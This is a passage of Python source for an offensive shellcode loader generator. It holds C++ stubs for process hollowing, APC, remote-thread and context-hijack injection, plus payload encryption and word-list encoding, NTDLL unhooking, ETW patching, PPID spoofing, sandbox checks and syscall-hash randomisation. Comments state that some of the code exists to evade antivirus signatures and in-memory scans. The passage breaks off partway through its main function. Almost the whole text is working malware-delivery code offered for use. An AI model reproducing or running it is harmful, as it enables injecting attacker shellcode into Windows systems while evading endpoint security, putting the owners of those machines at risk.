process_hollow_stub = """
    REPLACE_ME_SLEEP_CALL
    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
    //REPLACE_ME_SANDBOX_CALL
    REPLACE_ME_CALL_UNHOOK
    REPLACE_ME_SYSCALL_STUB_P2
    deC(REPLACE_ME_DECARG);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle(skCrypt("REPLACE_PPID_PROCESS"));
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    PROCESS_BASIC_INFORMATION bi;
    ULONG tmp;

    res = NewNtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)0, &bi, sizeof(bi), &tmp);

    if (res != 0){
        safe_print(skCrypt("NtQueryInformationProcess FAILED to query created process, exiting: "), res);
        return 0;
    }
    else {
        safe_print(skCrypt("NtQueryInformationProcess queried the created process sucessfully."));
    }

    __int64 TEST = (__int64)bi.PebBaseAddress;
    __int64 TEST2 = TEST + 0x10;
    PVOID ptrImageBaseAddress = (PVOID)TEST2;

    auto eString = skCrypt("bi.PebBaseAddress: ");
    printf("%s%#p\\n", eString.decrypt(), bi.PebBaseAddress);
    eString.clear();
    auto eString2 = skCrypt("ptrImageBaseAddress: ");
    printf("%s%#p\\n", eString2.decrypt(), ptrImageBaseAddress);
    eString2.clear();

    PVOID baseAddressBytes;
    unsigned char data[513];
    SIZE_T nBytes;

    res = NtReadVirtualMemory(hProcess, ptrImageBaseAddress, &baseAddressBytes, sizeof(PVOID), &nBytes);

    if (res != 0){
        safe_print(skCrypt("NtReadVirtualMemory FAILED to read image base address, exiting: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtReadVirtualMemory read image base address successfully."));
    }

    auto eString3 = skCrypt("baseAddressBytes: ");
    printf("%s%#p\\n", eString3.decrypt(), baseAddressBytes);
    eString3.clear();

    PVOID imageBaseAddress = (PVOID)(__int64)(baseAddressBytes);

    res = NtReadVirtualMemory(hProcess, imageBaseAddress, &data, sizeof(data), &nBytes);

    if (res != 0){
        safe_print(skCrypt("NtReadVirtualMemory FAILED to read first 0x200 bytes of the PE structure, exiting: "), res);
        auto eString4 = skCrypt("nBytes: ");
        printf("%s%#p\\n", eString4.decrypt(), nBytes);
        eString4.clear();
        return 0;
    }
    else{
        safe_print(skCrypt("NtReadVirtualMemory read first 0x200 bytes of the PE structure successfully."));
    }
    
    uint32_t e_lfanew = *reinterpret_cast<uint32_t*>(data + 0x3c);
    //std::cout << "e_lfanew: " << e_lfanew << std::endl;
    uint32_t entrypointRvaOffset = e_lfanew + 0x28;
    //std::cout << "entrypointRvaOffset: " << entrypointRvaOffset << std::endl;
    uint32_t entrypointRva = *reinterpret_cast<uint32_t*>(data + entrypointRvaOffset);
    //std::cout << "entrypointRva: " << entrypointRva << std::endl;
    __int64 rvaconv = (__int64)imageBaseAddress;
    __int64 rvaconv2 = rvaconv + entrypointRva;
    PVOID entrypointAddress = (PVOID)rvaconv2;
    auto eString5 = skCrypt("entrypointAddress: ");
    printf("%s%#p\\n", eString5.decrypt(), entrypointAddress);
    eString5.clear();

    ULONG oldprotect;
    SIZE_T bytesWritten;
    SIZE_T shellcodeLength = payload_len;

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, 0x40, &oldprotect);

    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to set permissions on entrypointAddress: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory set permissions on entrypointAddress successfully."));
    }

    res = NtWriteVirtualMemory(hProcess, entrypointAddress, decoded, payload_len, &bytesWritten);

    if (res != 0){
        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to entrypointAddress: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to entrypointAddress successfully."));
    }

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, oldprotect, &tmp);
    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to revert permissions on entrypointAddress: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory revert permissions on entrypointAddress successfully."));
    }

    res = NtResumeThread(hThread, &tmp);
    if (res != 0){
        safe_print(skCrypt("NtResumeThread FAILED to to resume thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtResumeThread resumed thread successfully."));
    }

    NewNtClose(hProcess);
    NewNtClose(hThread);
"""

CurrentThread_stub = """
    REPLACE_ME_SLEEP_CALL
    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
    //REPLACE_ME_SANDBOX_CALL

    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_CALL_UNHOOK
    REPLACE_ME_SYSCALL_STUB_P2
    deC(REPLACE_ME_DECARG);

    NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: "), res);
        return 0;
    }
    else {
        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the current process sucessfully."));
    }

    res = NtWriteVirtualMemory(hProc, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);

    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
    }

    res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0){
        safe_print(skCrypt("NtCreateThreadEx FAILED to create thread in current process: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtCreateThreadEx created thread in current process successfully."));
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
    }

    res = NtResumeThread(thandle, 0);

    if (res != 0){
        safe_print(skCrypt("NtResumeThread FAILED to resume created thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtResumeThread resumed created thread successfully."));
    }

    res = NewNtWaitForSingleObject(thandle, -1, NULL);   
"""

EnumDisplayMonitors_stub = """
    REPLACE_ME_SLEEP_CALL
    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
    //REPLACE_ME_SANDBOX_CALL

    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;
    NTSTATUS res;

    REPLACE_ME_CALL_UNHOOK
    REPLACE_ME_SYSCALL_STUB_P2
    deC(REPLACE_ME_DECARG);

    res = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT, PAGE_READWRITE);

    if (res != 0){
        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: "), res);
        return 0;
    }
    else {
        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the current process sucessfully."));
    }

    res = NtWriteVirtualMemory(hProc, base_addr, decoded, pnew, &bytesWritten);

    if (res != 0){
        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, &pnew, PAGE_EXECUTE_READ, &oldprotect);
    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
    }

    EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)base_addr, NULL);
"""

QueueUserAPC_stub = """

    REPLACE_ME_SLEEP_CALL
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
    //REPLACE_ME_SANDBOX_CALL
    REPLACE_ME_CALL_UNHOOK
    REPLACE_ME_SYSCALL_STUB_P2
    deC(REPLACE_ME_DECARG);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle(skCrypt("REPLACE_PPID_PROCESS"));
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: "), res);
        return 0;
    }
    else {
        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the created process sucessfully."));
    }

    res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
    }

    res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
    }

    res = NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)base_addr, NULL, NULL, NULL);

    if (res != 0){
        safe_print(skCrypt("NtQueueApcThread FAILED to add routine to APC queue: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtQueueApcThread added routine to APC queue successfully."));
    }

    res = NtAlertResumeThread(hThread, NULL);

    if (res != 0){
        safe_print(skCrypt("NtAlertResumeThread FAILED to resume thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtAlertResumeThread resumed thread successfully."));
    }

    NewNtClose(hProcess);
    NewNtClose(hThread);
"""

RemoteThreadSuspended_stub = """

    REPLACE_ME_SLEEP_CALL
    REPLACE_ME_SYSCALL_STUB_P2

    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    HANDLE hProcess = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
    //REPLACE_ME_SANDBOX_CALL
    deC(REPLACE_ME_DECARG);

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, skCrypt("REPLACE_ME_PROCESS")) == 0)
            {
                OBJECT_ATTRIBUTES oa;
                CLIENT_ID cid;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);
                cid.UniqueThread = 0;
                cid.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                NTSTATUS res = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
                if (res != 0){
                    safe_print(skCrypt("NtOpenProcess FAILED to open the target process, exiting: "), res);
                    return 0;
                }
                else {
                    safe_print(skCrypt("NtOpenProcess opened the target process sucessfully."));
                }

                res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                if (res != 0){
                    safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: "), res);
                    return 0;
                }
                else {
                    safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the current process sucessfully."));
                }

                res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

                if (res != 0){
                    safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
                    return 0;
                }
                else{
                    safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
                }

                res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);

                if (res != 0){
                    safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
                    return 0;
                }
                else{
                    safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
                }

                res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProcess, base_addr, NULL, TRUE, 0, 0, 0, NULL);

                if (res != 0){
                    safe_print(skCrypt("NtCreateThreadEx FAILED to create thread in current process: "), res);
                    return 0;
                }
                else{
                    safe_print(skCrypt("NtCreateThreadEx created thread in current process successfully."));
                }

                safe_print(skCrypt("Sleeping for 10 seconds to avoid in-memory AV scan..."));
                Sleep(10000);

                res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

                if (res != 0){
                    safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
                    return 0;
                }
                else{
                    safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
                }

                res = NtResumeThread(thandle, 0);

                if (res != 0){
                    safe_print(skCrypt("NtResumeThread FAILED to resume created thread: "), res);
                    return 0;
                }
                else{
                    safe_print(skCrypt("NtResumeThread resumed created thread successfully."));
                }

                NewNtClose(hProcess);
                NewNtClose(thandle);
            }
        }
    }

    NewNtClose(snapshot);
"""

RemoteThreadContext_stub = """
    REPLACE_ME_SLEEP_CALL
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
    //REPLACE_ME_SANDBOX_CALL
    REPLACE_ME_CALL_UNHOOK
    REPLACE_ME_SYSCALL_STUB_P2
    deC(REPLACE_ME_DECARG);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle(skCrypt("REPLACE_PPID_PROCESS"));
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;

    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: "), res);
        return 0;
    }
    else {
        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the created process sucessfully."));
    }

    res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
    }

    res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
    }

    FARPROC _loadLibrary = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
    if (_loadLibrary == NULL) {
        safe_print(skCrypt("[X] Error: Could not find address of LoadLibrary"));
        return 0;
    }

    HANDLE hThread;

    res = NtCreateThreadEx(&hThread, MAXIMUM_ALLOWED, NULL, hProcess, (PVOID)_loadLibrary, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0){
        safe_print(skCrypt("NtCreateThreadEx FAILED to create thread in current process: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtCreateThreadEx created thread in current process successfully."));
    }

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_CONTROL;

    res = NtGetContextThread(hThread, &ctx);

    if (res != 0){
        safe_print(skCrypt("NtGetContextThread FAILED to get context of thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtGetContextThread got context of thread successfully."));
    }

    ctx.Rip = (DWORD64)base_addr;

    res = NtSetContextThread(hThread, &ctx);

    if (res != 0){
        safe_print(skCrypt("NtSetContextThread FAILED to set context of thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtSetContextThread set context of thread successfully."));
    }

    res = NtResumeThread(hThread, 0);

    if (res != 0){
        safe_print(skCrypt("NtResumeThread FAILED to resume created thread: "), res);
        return 0;
    }
    else{
        safe_print(skCrypt("NtResumeThread resumed created thread successfully."));
    }

    NewNtClose(hProcess);
    NewNtClose(hThread);
"""

invoke_sandbox_check = """
    CheckSandbox();

    safe_print(skCrypt("Sandbox checks passed"));
"""

rundll_stub = """
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    //HANDLE threadhandle;
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            main();
            //threadhandle = CreateThread(NULL, 0, main, NULL, 0, NULL);
            //CloseHandle(threadhandle);
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
"""

unhook_definitions = """
#define NtCurrentProcess()     ((HANDLE)-1)
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
"""

unhook_call = """
    safe_print(skCrypt("[+] Unhooking NTDLL"));
    LPVOID nt = MapNtdll();
    if (!nt) {
        safe_print(skCrypt("Failed to map NTDLL"));
        return -1;
    }
    

    if (!Unhook(nt)) {
        safe_print(skCrypt("Failed in Unhooking!"));
        return -2;
    }

    safe_print(skCrypt("[+] NTDLL unhooked"));


    safe_print(skCrypt("[+] Patching ETW"));
    if (!DisableETW()) {
        safe_print(skCrypt("Failed in patching ETW"));
        return -3;
    }
    safe_print(skCrypt("[+] ETW patched"));
"""

# Thanks to @S4ntiagoP and @Snovvcrash for the API hashing code
def get_old_seed(syscall_arg):
    if syscall_arg == "syswhispers2":
        with open('SW2Syscalls.h') as f:
            code = f.read()
        match = re.search(r'#define SW2_SEED (0x[a-fA-F0-9]{8})', code)
        assert match is not None, 'SW2_SEED not found!'
        return match.group(1)
    elif syscall_arg == "syswhispers3":
        with open('SW3Syscalls.h') as f:
            code = f.read()
        match = re.search(r'#define SW3_SEED (0x[a-fA-F0-9]{8})', code)
        assert match is not None, 'SW3_SEED not found!'
        return match.group(1)

def replace_seed(old_seed, new_seed, syscall_arg):
    if syscall_arg == "syswhispers2":
        with open('SW2Syscalls.h') as f:
            code = f.read()
        code = code.replace(
            f'#define SW2_SEED {old_seed}',
            f'#define SW2_SEED 0x{new_seed:08X}',
            1
        )
        with open('SW2Syscalls.h', 'w') as f:
            f.write(code)
    elif syscall_arg == "syswhispers3":
        with open('SW3Syscalls.h') as f:
            code = f.read()
        code = code.replace(
            f'#define SW3_SEED {old_seed}',
            f'#define SW3_SEED 0x{new_seed:08X}',
            1
        )
        with open('SW3Syscalls.h', 'w') as f:
            f.write(code)

def get_function_hash(seed, function_name):
    function_hash = seed
    if function_name[:2] == 'Nt':
        function_name = 'Zw' + function_name[2:]
    if function_name[:3] == 'New':
        function_name = 'Zw' + function_name[5:]
    name = function_name + '\0'
    ror8 = lambda v: ((v >> 8) & (2 ** 32 - 1)) | ((v << 24) & (2 ** 32 - 1))

    for segment in [s for s in [name[i:i + 2] for i in range(len(name))] if len(s) == 2]:
        partial_name_short = struct.unpack('<H', segment.encode())[0]
        function_hash ^= partial_name_short + ror8(function_hash)

    return function_hash

def replace_syscall_hashes(seed, syscall_arg):
    if syscall_arg == "syswhispers2":
        syscallFileName = "SW2Syscalls.h"
        getSyscallNumFunc = "SW2_GetSyscallNumber"
    elif syscall_arg == "syswhispers3":
        syscallFileName = "SW3Syscalls.h"
        getSyscallNumFunc = "SW3_GetSyscallNumber"
    with open(syscallFileName) as f:
        code = f.read()
    regex = re.compile(r'#define (Nt[^(]+) ')
    syscall_names = re.findall(regex, code)
    syscall_names.extend(["NewNtClose", "NewNtQueryInformationProcess", "NewNtWaitForSingleObject"])
    syscall_names = set(syscall_names)
    syscall_definitions = code.split(f'EXTERN_C DWORD {getSyscallNumFunc}')[2]

    for syscall_name in syscall_names:
        regex = re.compile('#define ' + syscall_name + '.*?mov ecx, (0x0[A-Fa-f0-9]{8})', re.DOTALL)
        match = re.search(regex, syscall_definitions)
        assert match is not None, f'hash of syscall {syscall_name} not found!'
        old_hash = match.group(1)
        new_hash = get_function_hash(seed, syscall_name)
        #print(f'{syscall_name} -> {old_hash} -> 0x0{new_hash:08X}')
        code = code.replace(
            old_hash,
            f'0x0{new_hash:08X}'
        )

    with open(syscallFileName, 'w') as f:
        f.write(code)

def generateKey(length):
    letters = string.ascii_letters + string.digits
    key = ''.join(random.choice(letters) for i in range(length))
    return key

def generateRandomSyscall(length):
    letters = string.ascii_letters
    syscall = ''.join(random.choice(letters) for i in range(length))
    return syscall


def main(stub, infile, outfile, key, process, method, no_randomize, verbose, sandbox, no_sandbox, obfuscator_LLVM, word_encode, dll, sandbox_arg, no_ppid_spoof, dll_proxy, unhook, syscall_arg, create_process, target_dll, export_function, ppid_process, ppid_priv):
    print("[+] ICYGUIDER'S CUSTOM SYSCALL SHELLCODE LOADER")
    if obfuscator_LLVM == True:
        if syscall_arg == "syswhispers2" or syscall_arg == "syswhispers3":
            print("[+] SysWhispers is not compatible with Obfuscator-LLVM; switching to GetSyscallStub")
            syscall_arg = "getsyscallstub"
    method = method.lower()
    file_size = os.path.getsize(infile)
    if method == "processhollow":
        #Take infile and add 5000 nops to shellcode.
        #This is because our shellcode doesn't seem to end up exactly where we write it to for some reason.
        #If you know why this is happening, feel free to reach out to me!
        with open(infile, 'rb') as contents:
            save = contents.read()
        tempfile = "temp_infile"
        with open(tempfile, 'wb') as contents:
            contents.write(b"\x90"*5000)
            contents.write(save)
        file = open(tempfile, 'rb')
        contents = file.read()
        file.close()
        os.system("rm {}".format(tempfile))
    else:
        file = open(infile, 'rb')
        contents = file.read()
        file.close()

    if word_encode == False:
        encrypted = []
        for b in range(len(contents)):
            test = contents[b] ^ ord(key[b % len(key)])
            encrypted.append("{:02x}".format(test))

        stub = stub.replace("REPLACE_DECODE_FUNCTION", regularDecode)

        output = "unsigned char payload[] = {"

        count = 0
        for x in encrypted:
            if count < len(encrypted)-1:
                output += "0x{},".format(x)
            else:
                output += "0x{}".format(x)
            count += 1

        output += "};"

        stub = stub.replace("REPLACE_ME_SHELLCODE_VARS", regularShellcode)
        stub = stub.replace("REPLACE_ME_PAYLOAD", output)
        stub = stub.replace("REPLACE_ME_KEY", key)
    else:
        print("[+] Storing shellcode as english word list")
        if os.path.exists("words_alpha.txt") == False:
            print("[+] Downloading list of english words...")
            urllib.request.urlretrieve('https://github.com/dwyl/english-words/raw/master/words_alpha.txt', "words_alpha.txt")
        f = open("words_alpha.txt", "r")
        wordlist = f.readlines()
        f.close()
        chosen = []
        cwordstring = "char* words[256] = {"
        for i in range(256):
            selection = wordlist[random.randint(0, len(wordlist))].strip("\n")
            cwordstring += '"{}", '.format(selection)
            chosen.append(selection)
        cwordstring = cwordstring[:-2]
        cwordstring += "};"

        fwordsstring = "char* filewords[{}] = {{".format(len(contents))

        filewords = [None] * len(contents)
        for i in range(len(contents)):
            #print(contents[i])
            filewords[i] = chosen[int(contents[i])]
            fwordsstring += '"{}", '.format(filewords[i])

        fwordsstring = fwordsstring[:-2]
        fwordsstring += "};"
        stub = stub.replace("REPLACE_DECODE_FUNCTION", wordDecode)
        stub = stub.replace("REPLACE_ME_SHELLCODE_VARS", wordShellcode)
        stub = stub.replace("REPLACE_ME_WORDLIST", cwordstring)
        stub = stub.replace("REPLACE_ME_FILEWORDS", fwordsstring)

    stub = stub.replace("REPLACE_SAFEPRINT_FUNCTIONS", safePrint)

    if method == "processhollow":
        stub = stub.replace("REPLACE_THREADLESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_THREADLESS_DEFINITIONS", "")
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", process_hollow_stub)
        print("[+] Using {} for process hollowing".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "queueuserapc":
        stub = stub.replace("REPLACE_THREADLESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_THREADLESS_DEFINITIONS", "")
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", QueueUserAPC_stub)
        print("[+] Using {} for QueueUserAPC injection".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "remotethreadsuspended":
        stub = stub.replace("REPLACE_THREADLESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_THREADLESS_DEFINITIONS", "")
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_STUB_METHOD", RemoteThreadSuspended_stub)
        print("[+] Using {} for RemoteThreadSuspended injection".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "remotethreadcontext":
        stub = stub.replace("REPLACE_THREADLESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_THREADLESS_DEFINITIONS", "")
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", RemoteThreadContext_stub)
        print("[+] Using {} for RemoteThreadContext injection".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "currentthread":
        stub = stub.replace("REPLACE_THREADLESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_THREADLESS_DEFINITIONS", "")
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_STUB_METHOD", CurrentThread_stub)
    if method == "modulestomping":
        stub = stub.replace("REPLACE_THREADLESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_THREADLESS_DEFINITIONS", "")
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", module_stomping_stub)
        stub = stub.replace("REPLACE_ME_PROCESS", process)
        print("[+] Using {} for ModuleStomping".format(process))
    if method == "enumdisplaymonitors":
        stub = stub.replace("REPLACE_THREADLESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_THREADLESS_DEFINITIONS", "")
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_STUB_METHOD", EnumDisplayMonitors_stub)
    if method == "threadlessinject":
        stub = stub.replace("REPLACE_THREADLESS_FUNCTIONS", threadless_functions)
        stub = stub.replace("REPLACE_THREADLESS_DEFINITIONS", threadless_definitions)
        stub = stub.replace("REPLACE_STUB_METHOD", threadless_inject_stub)
        stub = stub.replace("REPLACE_ME_PROCESS", process)
        if create_process == True:
            print("[+] Will create process to inject into")
            stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
            stub = stub.replace("CREATE_SUSPENDED | ", "")
            stub = stub.replace("REPLACE_THREADLESS_CREATE_PROCESS", threadless_inject_create_stub)
        else:
            print("[+] Injecting into existing process")
            stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", get_parent_handle_stub_only)
            stub = stub.replace("REPLACE_THREADLESS_CREATE_PROCESS", threadless_inject_nocreate_stub)
        stub = stub.replace("REPLACE_ME_PROCESS", process)
        stub = stub.replace("REPLACE_GET_PROCESS_ARG", process.split("\\\\")[-1])
        stub = stub.replace("REPLACE_THREADLESS_TARGET_DLL", str(list(target_dll))[1:-1])
        stub = stub.replace("REPLACE_EXPORT_FUNCTION", str(list(export_function))[1:-1])
        print(f"[+] Writing to {export_function} export function in {target_dll}")
        print("[+] Using {} for ThreadlessInject".format(process))

    if word_encode == False:
        stub = stub.replace("REPLACE_ME_DECARG", "payload")
    else:
        stub = stub.replace("REPLACE_ME_DECARG", "")

    if unhook == True:
        print("[+] NTDLL unhooking enabled")
